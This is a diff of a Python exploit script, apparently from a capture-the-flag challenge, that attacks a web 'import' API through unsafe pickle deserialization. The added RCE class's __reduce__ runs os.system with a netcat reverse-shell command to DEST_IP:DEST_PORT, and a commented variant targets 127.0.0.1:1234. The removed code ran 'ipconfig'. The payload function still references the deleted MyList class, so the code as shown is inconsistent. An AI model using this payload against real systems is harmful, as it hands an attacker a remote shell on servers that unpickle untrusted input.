@@ -8,11 +8,13 @@ def normal_usage(debug=True):
     '''
     this gets accepted by the import api
     '''
+    print('normal layout:\n')
     url = 'http://ctf.adl.tw:12004/api/import'
     my_layout = [
         {'id': 'bocchi', 'left': 350, 'top': 180}
         
     ]
+    print("typeof mylayout:",type(my_layout))
     my_layout=pickle.dumps(my_layout)
     my_layout=base64.b64encode(my_layout)
     my_layout=str(my_layout,'utf-8')
@@ -25,24 +27,24 @@ def normal_usage(debug=True):
     return
 
 
-class MyList(list):
-    def __reduce__(self) :
-        #_my_dict={'id': 'bocchi', 'left': 350, 'top': 180}
-        #self.append(_my_dict)
-        return os.system,('ipconfig',)
+class RCE:
+    def __reduce__(self):
+        #cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
+        #       '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
+        cmd='mkfifo /tmp/pipe;cat /tmp/pipe|nc DEST_IP DEST_PORT|/bin/bash &>/tmp/pipe;rm /tmp/pipe'
+        
+        return os.system, (cmd,)
         
 
 def payload(debug=True):
-    '''
-    hopefully this gets a reverse shell
-    '''
+    
+    print('payload layout:\n')
     url = 'http://ctf.adl.tw:12004/api/import'
-    _keys=['id', 'left', 'top']
-    _values=['eye01', 350, 180]
-    my_layout = MyList(zip(_keys,_values))
-    #my_layout.append(_my_dict)
 
-   
+    my_layout:list[dict] =MyList()
+
+
+    print("typeof mylayout:",type(my_layout))
     my_layout=pickle.dumps(my_layout)
     my_layout=base64.b64encode(my_layout)
     my_layout=str(my_layout,'utf-8')
@@ -52,13 +54,10 @@ def payload(debug=True):
 
 
     myobj={'layout':my_layout}
-
     r = requests.post(url, json = myobj)
-    pass
     return
-payload()
-#normal_usage()
 
-#gASVIAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAhpcGNvbmZpZ5SFlFKULg==
-#gASVIAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAhpcGNvbmZpZ5SFlFKULg==
-#gASVIAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAhpcGNvbmZpZ5SFlFKULg==
+
+normal_usage()
+payload()
+
